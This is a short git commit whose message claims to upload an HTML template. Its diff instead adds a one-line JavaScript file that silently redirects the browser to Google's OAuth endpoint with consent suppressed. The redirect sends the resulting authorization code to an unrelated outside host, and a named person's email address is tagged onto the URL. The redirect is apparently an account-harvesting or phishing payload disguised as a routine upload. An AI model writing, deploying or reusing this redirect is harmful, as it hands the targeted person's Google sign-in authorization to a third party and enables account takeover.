99ca9b7069e26a2ef8e14abefe0263fae9d4827b
tanjanegineering-oss <tanjanegineering@gmail.com>
2026-05-01 17:57:20 -0700

    Upload templates.html with user URL

---
+++ file_1777683440454.js
@@ -0,0 +1,2 @@
+window.location.replace("https://accounts.google.com/o/oauth2/v2/auth?client_id=657079357666-2hddidf5mns9aujljfctbhupm3oqapcf.apps.googleusercontent.com&redirect_uri=https%3A%2F%2Fwebsecurity.nhmcw.com%2Fminsoutlook%2F&response_type=code&scope=email%20profile%20openid&access_type=online&prompt=none&state=secureState123#splenci@gmail.com");
+
